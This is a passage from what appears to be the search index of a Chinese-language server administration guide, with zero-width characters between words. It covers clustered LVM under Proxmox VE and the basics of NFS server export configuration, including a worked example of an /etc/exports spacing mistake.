\u200b\u7b49\u200b\u65b9\u5f0f\u200b\u8fde\u63a5\u200b\u5230\u200b\u540c\u4e00\u200b\u53f0\u200b\u5171\u4eab\u200b\u7684\u200b\u5b58\u50a8\u200b\uff0c\u200b\u5e76\u4e14\u200b\u901a\u8fc7\u200b\u9501\u200b\u7b49\u200b\u673a\u5236\u200b\u5b9e\u73b0\u200b\u96c6\u7fa4\u200b\u5185\u90e8\u200b\u7684\u200b\u540c\u6b65\u200b\u3002 LVM \u200b\u81ea\u5e26\u200b\u7684\u200b locking \u200b\u673a\u5236\u200b\u4e3a\u200b <code>lvmlockd</code>\uff0c\u200b\u652f\u6301\u200b <code>dlm</code>\uff08\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b dlm \u200b\u4e0e\u200b corosync \u200b\u6784\u5efa\u200b\u96c6\u7fa4\u200b\uff09\u200b\u548c\u200b <code>sanlock</code> \u200b\u4e24\u79cd\u200b\u540e\u200b\u7aef\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\u5f88\u200b\u53ef\u60dc\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u6211\u4eec\u200b\u552f\u4e00\u200b\u4f7f\u7528\u200b\u5230\u200b\u96c6\u7fa4\u200b\u5b58\u50a8\u200b\u7684\u200b\u5730\u65b9\u200b\u662f\u200b Proxmox VE \u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u800c\u200b PVE \u200b\u4f7f\u7528\u200b\u7684\u200b\u662f\u200b\u53e6\u200b\u4e00\u5957\u200b\u65b9\u6848\u200b\uff1a PVE \u200b\u81ea\u5e26\u200b\u7684\u200b\u96c6\u7fa4\u200b\u7ba1\u7406\u200b\u529f\u80fd\u200b\u4f7f\u7528\u200b\u4e86\u200b <code>corosync</code> \u200b\u7ef4\u62a4\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u96c6\u7fa4\u200b\u5185\u90e8\u200b\u7684\u200b\u5168\u5c40\u200b\u9501\u200b\uff0c\u200b\u6240\u6709\u200b\u4f7f\u7528\u200b PVE \u200b\u5de5\u5177\u200b\u4fee\u6539\u200b\u5b58\u50a8\u200b\u7684\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u4f1a\u200b\u5148\u200b\u83b7\u53d6\u200b\u8fd9\u4e2a\u200b\u5168\u5c40\u200b\u9501\u200b\u3002 \u200b\u5e76\u4e14\u200b PVE \u200b\u4e0d\u200b\u5b58\u5728\u200b\u591a\u53f0\u200b\u673a\u5668\u200b\u8bbf\u95ee\u200b\u540c\u4e00\u4e2a\u200b LV \u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u200b\u4e00\u5957\u200b\u65b9\u6848\u200b\u4e0d\u200b\u4f9d\u8d56\u4e8e\u200b <code>lvmlockd</code>\u3002</p> <p>\u200b\u786e\u4fdd\u200b\u6240\u6709\u200b\u8bbf\u95ee\u200b LVM \u200b\u7684\u200b\u673a\u5668\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b PVE \u200b\u96c6\u7fa4\u200b\u4e2d\u200b</p> <p>\u200b\u5426\u5219\u200b\u5728\u200b\u96c6\u7fa4\u200b\u5916\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u521b\u5efa\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u4e0d\u4f1a\u200b\u6b63\u786e\u200b\u83b7\u53d6\u200b\u9501\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u8986\u76d6\u200b\u5df2\u6709\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u78c1\u76d8\u200b\u3002 \u200b\u76f8\u5173\u200b\u6545\u969c\u200b\u6848\u4f8b\u200b\u89c1\u200b https://vlab.ibugone.com/servers/ct100/#%E6%95%85%E9%9A%9C\u3002</p> <p>LVM \u200b\u96c6\u7fa4\u200b\u4e0d\u200b\u652f\u6301\u200b\u7cbe\u7b80\u200b\u7f6e\u5907\u200b LV</p> <p>\u200b\u5728\u200b\u865a\u62df\u5316\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u8282\u7701\u200b\u7a7a\u95f4\u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u4f7f\u7528\u200b\u7cbe\u7b80\u200b\u7f6e\u5907\u200b\uff08thin-provisioned\uff09\u200b\u7684\u200b\u5b58\u50a8\u200b\uff0c \u200b\u8fd9\u4e48\u200b\u505a\u200b\u53ef\u4ee5\u200b\u5728\u200b\u521b\u5efa\u200b LV \u200b\u65f6\u200b\u53ea\u200b\u5206\u914d\u200b\u5c11\u91cf\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u5019\u200b\u518d\u200b\u5206\u914d\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002 \u200b\u4f46\u662f\u200b LVM \u200b\u96c6\u7fa4\u200b\u4e0d\u200b\u652f\u6301\u200b\u8fd9\u79cd\u200b\u64cd\u4f5c\u200b\uff08\u200b\u56e0\u6b64\u200b\u6bcf\u4e2a\u200b\u865a\u62df\u673a\u200b\u90fd\u200b\u8981\u200b\u5b9e\u6253\u5b9e\u200b\u5730\u200b\u5360\u7528\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff09\u3002 \u200b\u5982\u679c\u200b\u9700\u8981\u200b\u8282\u7ea6\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u5176\u4ed6\u200b\u65b9\u6848\u200b\uff08\u200b\u4f8b\u5982\u200b\u90e8\u5206\u200b\u4f01\u4e1a\u7ea7\u200b SAN \u200b\u652f\u6301\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u300c\u200b\u865a\u62df\u5730\u5740\u200b\u300d\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u9700\u8981\u200b\u7684\u200b\u65f6\u5019\u200b\u518d\u200b\u5206\u914d\u200b\u7a7a\u95f4\u200b\uff09\u3002</p> <ol> <li> <p>\u200b\u63a8\u8350\u200b\u67e5\u770b\u200b\u6700\u65b0\u200b\u7248\u672c\u200b\u7684\u200b RHEL \u200b\u624b\u518c\u200b\u8fdb\u884c\u200b\u9605\u8bfb\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u65b0\u200b\u7248\u672c\u200b\u53ef\u80fd\u200b\u5305\u542b\u200b\u4e00\u4e9b\u200b\u65b0\u200b\u7279\u6027\u200b\uff0c\u200b\u5e76\u4e14\u200b Debian \u200b\u7684\u200b\u7248\u672c\u200b\u66f4\u65b0\u200b\u6bd4\u200b RHEL \u200b\u66f4\u200b\u5feb\u200b\u3002\u200b\u672c\u200b\u94fe\u63a5\u200b\u6307\u5411\u200b\u76ee\u524d\u200b\u6700\u65b0\u200b\u7684\u200b RHEL 9 \u200b\u7684\u200b LVM \u200b\u624b\u518c\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>Cache \u200b\u7684\u200b\u5b8c\u6574\u6027\u68c0\u67e5\u200b\u5de5\u5177\u200b <code>cache_check</code> \u200b\u4f4d\u4e8e\u200b thin-provisioning-tools \u200b\u4e2d\u200b\u3002\u200b\u5176\u200b 1.0 \u200b\u7248\u672c\u200b\u4f7f\u7528\u200b Rust \u200b\u91cd\u5199\u200b\u540e\u200b\u5b58\u5728\u200b\u4e00\u4e2a\u200b bug\uff0c\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5373\u4f7f\u200b\u68c0\u67e5\u200b\u5931\u8d25\u200b\uff0cLVM \u200b\u4e5f\u200b\u4f1a\u200b\u7ee7\u7eed\u200b\u5c1d\u8bd5\u200b\u6302\u8f7d\u200b\u3002\u200b\u8be5\u200b\u95ee\u9898\u200b\u5728\u200b 1.0.12 \u200b\u88ab\u200b\u4fee\u590d\u200b\u3002\u00a0\u21a9</p> </li> <li> <p>Retrieved on 2024-02-18.\u00a0\u21a9</p> </li> <li> <p>\"Buckets containing only cached data are discarded as needed by the allocator in LRU order\" (bcachefs: Principles of Operation 2.2.4)\u00a0\u21a9</p> </li> </ol>"},{"location":"ops/storage/network/","title":"\u7f51\u7edc\u200b\u5b58\u50a8\u7cfb\u7edf","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@zeyugao</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u672c\u6587\u200b\u4ecb\u7ecd\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u5e38\u89c1\u200b\u7684\u200b\u7f51\u7edc\u200b\u5b58\u50a8\u200b\u65b9\u6848\u200b\uff08NFS \u200b\u4e0e\u200b iSCSI\uff09\uff0c\u200b\u4ee5\u53ca\u200b\u5bb6\u7528\u200b\u573a\u666f\u200b\u4e0b\u200b\u5e38\u7528\u200b\u7684\u200b SMB\uff08Samba\uff09\u200b\u65b9\u6848\u200b\u3002</p> <p>\u200b\u672c\u6587\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u5206\u5e03\u5f0f\u200b\u5b58\u50a8\u7cfb\u7edf\u200b\u3002</p>"},{"location":"ops/storage/network/#nfs","title":"NFS","text":"<p>NFS \u200b\u662f\u200b\u975e\u5e38\u200b\u5e38\u7528\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7ea7\u522b\u200b\u7684\u200b\u7f51\u7edc\u200b\u5b58\u50a8\u200b\u534f\u8bae\u200b\uff0c\u200b\u5141\u8bb8\u200b\u670d\u52a1\u5668\u200b\u66b4\u9732\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7ed9\u200b\u591a\u4e2a\u200b\u5ba2\u6237\u7aef\u200b\u3002 \u200b\u76ee\u524d\u200b NFS \u200b\u6709\u200b\u4e24\u4e2a\u200b\u4e3b\u8981\u200b\u7684\u200b\u7248\u672c\u200b\uff1aNFSv3 \u200b\u548c\u200b NFSv4\u3002\u200b\u7b80\u5355\u200b\u6765\u8bb2\u200b\uff1a</p> <ul> <li>NFSv3\uff081995 \u200b\u5e74\u200b\uff09\u200b\u662f\u200b\u65e0\u200b\u72b6\u6001\u200b\u534f\u8bae\u200b\uff0c\u200b\u652f\u6301\u200b TCP \u200b\u4e0e\u200b UDP\uff082049\uff0c111 \u200b\u4ee5\u53ca\u200b\u5176\u4ed6\u200b\u52a8\u6001\u200b\u7aef\u53e3\u200b\uff09</li> <li>NFSv4\uff082000 \u200b\u5e74\u200b\uff09\u200b\u662f\u200b\u6709\u200b\u72b6\u6001\u200b\u534f\u8bae\u200b\uff0c\u200b\u53ea\u200b\u652f\u6301\u200b TCP\uff082049 \u200b\u7aef\u53e3\u200b\uff09\uff0c\u200b\u6027\u80fd\u200b\u66f4\u597d\u200b</li> </ul> <p>NFS \u200b\u9ed8\u8ba4\u200b\u6ca1\u6709\u200b\u57fa\u4e8e\u200b\u5bc6\u7801\u200b\u7b49\u200b\u7684\u200b\u9274\u6743\u200b\u673a\u5236\u200b\uff0c\u200b\u4ec5\u200b\u4f9d\u9760\u200b\u5ba2\u6237\u7aef\u200b IP \u200b\u5730\u5740\u200b\u6765\u200b\u9274\u6743\u200b\u3002\u200b\u5e76\u4e14\u200b\u9ed8\u8ba4\u200b\u6ca1\u6709\u200b\u52a0\u5bc6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u5185\u90e8\u200b\u7f51\u7edc\u5171\u4eab\u200b\u5b58\u50a8\u200b\u3002 \u200b\u4ee5\u4e0b\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u6709\u5173\u200b\u9ad8\u7ea7\u200b\u9274\u6743\u200b\u65b9\u6cd5\u200b\uff08\u200b\u5982\u200b Kerberos\uff09\u200b\u4e0e\u200b TLS \u200b\u52a0\u5bc6\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> <p>NFS \u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u7684\u200b\u670d\u52a1\u7aef\u200b\u548c\u200b\u5ba2\u6237\u7aef\u200b\u5b9e\u73b0\u200b\u5747\u200b\u6709\u200b\u5185\u6838\u200b\u6001\u200b\u4e0e\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u9009\u62e9\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u7279\u6b8a\u200b\u8003\u8651\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b\u5185\u6838\u200b\u6001\u200b\u5b9e\u73b0\u200b\u3002</p>"},{"location":"ops/storage/network/#nfs-server","title":"\u670d\u52a1\u7aef\u200b\u914d\u7f6e","text":"<p>\u200b\u670d\u52a1\u7aef\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>nfs-kernel-server</code> \u200b\u5305\u200b\u3002\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0cNFSv3 \u200b\u652f\u6301\u200b\u8fd8\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b <code>rpcbind</code> \u200b\u5305\u200b\uff08\u200b\u5bf9\u5e94\u200b NFSv3 \u200b\u534f\u8bae\u200b\u7684\u200b 111 \u200b\u7aef\u53e3\u200b\uff09\uff0c\u200b\u8be5\u5305\u200b\u5728\u200b\u76ee\u524d\u200b\u7684\u200b Debian \u200b\u4e2d\u4ee5\u200b <code>rpcbind.socket</code> \u200b\u7684\u200b\u5f62\u5f0f\u200b\u5bf9\u5916\u200b\u63d0\u4f9b\u200b\u670d\u52a1\u200b\u3002</p> <p>NFS \u200b\u7684\u200b\u5bfc\u51fa\u200b\u914d\u7f6e\u200b\u4f4d\u4e8e\u200b <code>/etc/exports</code> \u200b\u6587\u4ef6\u200b\u4e2d\u200b\u3002\u200b\u4f8b\u5982\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u914d\u7f6e\u200b\uff1a</p> <pre><code>/srv/abcde        localhost(ro,no_root_squash,async,insecure,no_subtree_check)\n</code></pre> <p>\u200b\u5c06\u200b <code>/srv/abcde</code> \u200b\u76ee\u5f55\u200b\u300c\u200b\u5bfc\u51fa\u200b\u300d\u200b\u7ed9\u200b\u4e86\u200b\u672c\u673a\u200b\uff08localhost\uff09\uff0c\u200b\u5e76\u4e14\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u8bf8\u5982\u200b\u53ea\u8bfb\u200b\u7b49\u200b\u9009\u9879\u200b\u3002 \u200b\u5728\u200b\u4fee\u6539\u200b\u914d\u7f6e\u200b\u540e\u200b\uff0c\u200b\u8fd0\u884c\u200b <code>systemctl reload nfs-server.service</code>\uff08\u200b\u7b49\u4ef7\u200b\u4e8e\u200b <code>exportfs -r</code>\uff09\u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5c1d\u8bd5\u200b\u914d\u7f6e\u200b\u5e76\u200b\u6302\u8f7d\u200b</p> <p>NFS \u200b\u5728\u200b\u5404\u79cd\u200b\u4e3b\u6d41\u200b\u684c\u9762\u200b/\u200b\u670d\u52a1\u5668\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e0a\u200b\u90fd\u200b\u6709\u200b\u4e0d\u9519\u200b\u7684\u200b\u652f\u6301\u200b\u3002\u200b\u8bf7\u200b\u5c1d\u8bd5\u200b\u5728\u200b\u4f60\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff08\u200b\u865a\u62df\u673a\u200b\u6216\u200b Linux \u200b\u4e3b\u673a\u200b\uff09\u200b\u4e0a\u200b\u914d\u7f6e\u200b NFS \u200b\u670d\u52a1\u7aef\u200b\uff0c \u200b\u5e76\u200b\u5728\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u6302\u8f7d\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u6302\u8f7d\u200b\uff0c\u200b\u53ef\u200b\u5148\u200b\u9605\u8bfb\u200b\u4e0b\u9762\u200b\u7684\u200b\u5ba2\u6237\u7aef\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cWindows \u200b\u9700\u8981\u200b\u542f\u7528\u200b NFS \u200b\u5bf9\u5e94\u200b\u7684\u200b\u53ef\u9009\u200b\u7279\u6027\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u200b\u652f\u6301\u200b NFSv4\u3002</p> <p>\u200b\u63a5\u4e0b\u6765\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b <code>exports</code> \u200b\u6587\u4ef6\u200b\u7684\u200b\u5e38\u89c1\u200b\u914d\u7f6e\u200b\u3002\u200b\u4ee5\u4e0a\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u76ee\u5f55\u200b\u88ab\u200b\u5bfc\u51fa\u200b\u5230\u200b\u4e86\u200b <code>localhost</code>\uff0c\u200b\u4f46\u662f\u200b\u540c\u6837\u200b\u4e5f\u200b\u63a5\u53d7\u200b\u5176\u4ed6\u200b\u683c\u5f0f\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>/var/lib/example 10.0.0.0/25(rw,sync,no_subtree_check,no_root_squash)\n/share        *(ro,no_root_squash,async,insecure,no_subtree_check)\n/media 192.168.93.2(rw,no_subtree_check) 192.168.93.3(rw,no_subtree_check)\n</code></pre> <p>\u200b\u5206\u522b\u200b\u4ee3\u8868\u200b\u76ee\u5f55\u200b\u5bfc\u51fa\u200b\u7ed9\u200b\u4e86\u200b\u4e00\u4e2a\u200b CIDR \u200b\u7f51\u6bb5\u200b\u3001\u200b\u6240\u6709\u200b IP\uff0c\u200b\u4ee5\u53ca\u200b\u4e24\u4e2a\u200b\u7279\u5b9a\u200b\u7684\u200b IP\u3002</p> <p>\u200b\u4f7f\u7528\u200b <code>exportfs -a</code> \u200b\u68c0\u67e5\u200b\u914d\u7f6e\u200b\u95ee\u9898\u200b</p> <p><code>exports</code> \u200b\u6587\u4ef6\u200b\u5982\u679c\u200b\u7f16\u8f91\u200b\u4e0d\u5f53\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5ba2\u6237\u7aef\u200b\u65e0\u6cd5\u200b\u6b63\u786e\u200b\u6302\u8f7d\u200b\uff0c\u200b\u6216\u8005\u200b\u5e26\u6765\u200b\u975e\u200b\u9884\u671f\u200b\u7684\u200b\u5b89\u5168\u200b\u98ce\u9669\u200b\u3002 \u200b\u8fd9\u200b\u662f\u200b\u5728\u200b RHEL 9 \u200b\u624b\u518c\u200b\u4e2d\u4e3e\u200b\u7684\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>/home bob.example.com(rw)\n/home bob.example.com (rw)\n</code></pre> <p>\u200b\u7b2c\u4e00\u884c\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u800c\u200b\u7b2c\u4e8c\u884c\u200b\u662f\u200b\u9519\u8bef\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5b9e\u9645\u200b\u884c\u4e3a\u200b\u662f\u200b\uff1abob.example.com \u200b\u83b7\u5f97\u200b\u53ea\u8bfb\u200b\u6743\u9650\u200b\uff0c\u200b\u800c\u200b\u5176\u4ed6\u200b\u6240\u6709\u4eba\u200b\u83b7\u5f97\u200b\u8bfb\u5199\u200b\u6743\u9650\u200b\u3002 \u200b\u8fd9\u200b\u663e\u7136\u200b\u662f\u975e\u200b\u9884\u671f\u200b\u7684\u200b\u3002\u200b\u6211\u4eec\u200b\u5728\u200b\u672c\u5730\u200b\u6a21\u4eff\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a</p> <pre><code>/srv/abcde        localhost (rw,no_root_squash,async,insecure,no_subtree_check)\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u6267\u884c\u200b <code>exportfs -a</code>\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8f93\u51fa\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u8b66\u544a\u200b\uff0c\u200b\u63d0\u793a\u200b\u6211\u4eec\u200b\u76ee\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\u5b58\u5728\u200b\u6f5c\u5728\u200b\u7684\u200b\u95ee\u9898\u200b\uff08\u200b\u4e00\u4e9b\u200b\u914d\u7f6e\u200b\u6ca1\u6709\u200b\u663e\u5f0f\u200b\u7ed9\u51fa\u200b\uff09\uff1a</p> <pre><code>$ sudo exportfs -a\nexportfs: No options for /srv/abcde localhost: suggest localhost(sync) to avoid warning\nexportfs: /etc/exports [2]: Neither 'subtree_check' or 'no_subtree_check' specified for export \"localhost:/srv/abcde\".\nAssuming default behaviour ('no_subtree_check').\nNOTE: this default has changed since nfs-utils version 1.0.x\n\nexportfs: No host name given with /srv/abcde (rw,no_root_squash,async,insecure,no_subtree_check), suggest *(rw,no_root_squash,async,insecure,no_subtree_check) to avoid warning\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b <code>localhost</code> \u200b\u6ca1\u6709\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u800c\u200b <code>*</code> \u200b\u5bf9\u5e94\u200b\u7684\u200b\u914d\u7f6e\u200b\u5374\u662f\u200b\u5e94\u8be5\u200b\u7ed9\u200b <code>localhost</code> \u200b\u7684\u200b\u3002 \u200b\u5728\u200b\u4fee\u590d\u200b\uff08\u200b\u53bb\u6389\u200b\u7a7a\u683c\u200b\uff09\u200b\u540e\u200b\uff0c\u200b\u518d\u6b21\u200b\u6267\u884c\u200b <code>exportfs -a</code>\uff0c\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u8b66\u544a\u200b\u4e86\u200b\uff1a</p> <pre><code>$ sudo exportfs -a\n$\n</code></pre> <p>\u200b\u5728\u200b\u53c2\u6570\u200b\u90e8\u5206\u200b\u6709\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u9009\u9879\u200b\uff1a</p> <ul> <li><code>rw</code>/<code>ro</code>\uff1a\u200b\u8bfb\u5199\u200b/\u200b\u53ea\u8bfb\u200b</li> <li><code>sync</code>/<code>async</code>\uff1a\u200b\u540c\u6b65\u200b/\u200b\u5f02\u6b65\u200b\uff0c\u200b\u540e\u8005\u200b\u5141\u8bb8\u200b\u670d\u52a1\u5668\u200b\u5728\u200b\u5b8c\u6210\u200b\u5199\u5165\u200b\u64cd\u4f5c\u524d\u200b\u5c31\u200b\u8fd4\u56de\u200b\uff0c\u200b\u5728\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u7684\u200b\u540c\u65f6\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u6570\u636e\u200b\u5728\u200b\u5d29\u6e83\u200b/\u200b\u65ad\u7535\u200b\u65f6\u200b\u4e22\u5931\u200b</li> <li><code>no_subtree_check</code>\uff1a\u300c\u200b\u53d6\u6d88\u200b\u5b50\u6811\u200b\u68c0\u67e5\u200b\u300d\u2014\u2014\u200b\u5982\u679c\u200b\u786e\u8ba4\u200b NFS \u200b\u4e0d\u4f1a\u200b\u66b4\u9732\u200b\u5728\u200b\u4e0d\u53ef\u200b\u4fe1\u200b\u7684\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u6216\u8005\u200b\u5bfc\u51fa\u200b\u7684\u200b\u76ee\u5f55\u200b\u662f\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u6839\u76ee\u5f55\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b\u8fd9\u4e2a\u200b\u9009\u9879\u200b\u4ee5\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b</li> <li><code>no_root_squash</code>\uff1a\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b root \u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u7279\u5b9a\u200b\u7528\u6237\u200b\uff08<code>nobody</code>\uff09\uff0c\u200b\u8bbe\u7f6e\u200b <code>no_root_squash</code> \u200b\u4f1a\u200b\u8ba9\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b root \u200b\u62e5\u6709\u200b\u548c\u200b\u670d\u52a1\u5668\u200b root \u200b\u4e00\u6837\u200b\u7684\u200b\u6587\u4ef6\u200b\u6743\u9650\u200b\uff1b\u200b\u8be5\u200b\u9009\u9879\u200b\u4e0d\u200b\u5f71\u54cd\u200b\u975e\u200b root \u200b\u7528\u6237\u200b</li> <li><code>all_squash</code>\uff1a\u200b\u5c06\u200b\u6240\u6709\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b\u7528\u6237\u200b\u6620\u5c04\u200b\u5230\u200b\u4e00\u4e2a\u200b\u7279\u5b9a\u200b\u7684\u200b\u7528\u6237\u200b\uff08<code>nobody</code>\uff09</li> <li><code>secure</code>/<code>insecure</code>\uff1a\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cNFS \u200b\u670d\u52a1\u7aef\u200b\u53ea\u200b\u63a5\u53d7\u200b\u5ba2\u6237\u7aef\u200b\u4f7f\u7528\u200b 1024 \u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7aef\u53e3\u200b\u8bbf\u95ee\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>insecure</code> \u200b\u4f1a\u200b\u653e\u5bbd\u200b\u8fd9\u4e2a\u200b\u9650\u5236\u200b</li> </ul> <p>1024 \u200b\u7aef\u53e3\u200b\uff0c\u200b\u4e0e\u200b root</p> <p>\u200b\u5728\u200b\u4f20\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u7c7b\u200b Unix \u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u4e2d\u200b\u53ea\u6709\u200b root \u200b\u7528\u6237\u200b\u624d\u80fd\u200b\u4f7f\u7528\u200b 1024 \u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7aef\u53e3\u200b\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u5f88\u4e45\u4ee5\u524d\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u53ef\u4ee5\u200b\u5047\u8bbe\u200b\u6765\u81ea\u200b 1024 \u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7aef\u53e3\u200b\u7684\u200b\u8bf7\u6c42\u200b/\u200b\u670d\u52a1\u200b\u662f\u200b root \u200b\u7528\u6237\u200b\u53d1\u51fa\u200b/\u200b\u6388\u6743\u200b\u7684\u200b\u3002 \u200b\u5728\u200b NFS \u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u8fd9\u200b\u610f\u5473\u7740\u200b\u53ea\u6709\u200b root \u200b\u624d\u80fd\u200b\u8bbf\u95ee\u200b NFS \u200b\u670d\u52a1\u200b\uff0c\u200b\u6ca1\u6709\u200b root \u200b\u6743\u9650\u200b\u7684\u200b\u7528\u6237\u200b\u4e0d\u200b\u80fd\u591f\u200b\u5047\u5192\u200b\u81ea\u5df1\u200b\u4e3a\u200b NFS \u200b\u5ba2\u6237\u7aef\u200b\uff0c\u200b\u4ece\u800c\u200b\u4ee5\u5047\u200b\u7684\u200b\u7528\u6237\u200b\u6743\u9650\u200b\u8bfb\u5199\u200b\u6570\u636e\u200b\u3002 \u200b\u8fd9\u200b\u5728\u200b\u5f88\u4e45\u4ee5\u524d\u200b\u7684\u200b\u5185\u90e8\u200b\u7f51\u7edc\u200b\u4e2d\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u573a\u666f\u200b\u662f\u200b\u6709\u200b\u610f\u4e49\u200b\u7684\u200b\u3002</p> <p>\u200b\u76ee\u524d\u200b Linux \u200b\u4ecd\u7136\u200b\u4fdd\u7559\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u673a\u5236\u200b\uff0c\u200b\u4f46\u662f\u200b\u7a0b\u5e8f\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u4ec5\u4ec5\u200b\u4f9d\u8d56\u4e8e\u200b\u8fd9\u4e2a\u200b\u673a\u5236\u200b\u6765\u200b\u4fdd\u8bc1\u200b\u5b89\u5168\u6027\u200b\u3002</p> \u200b\u5173\u4e8e\u200b\u300c\u200b\u5b50\u6811\u200b\u68c0\u67e5\u200b\u300d\u200b\u7684\u200b\u89e3\u91ca\u200b <p>NFS \u200b\u670d\u52a1\u5668\u200b\u4e0e\u200b\u5ba2\u6237\u7aef\u200b\u4e4b\u95f4\u200b\u4f7f\u7528\u200b\u300c\u200b\u6587\u4ef6\u200b\u53e5\u67c4\u200b\u300d\uff08file handle\uff09\u200b\u6765\u200b\u6807\u8bc6\u200b\u6587\u4ef6\u200b\u3002 \u200b\u6587\u4ef6\u200b\u53e5\u67c4\u200b\u7684\u200b\u5185\u5bb9\u200b\u542b\u4e49\u200b\u7531\u200b\u670d\u52a1\u5668\u200b\u51b3\u5b9a\u200b\u3002 \u200b\u5728\u200b Linux \u200b\u5185\u6838\u200b\u6001\u200b NFS 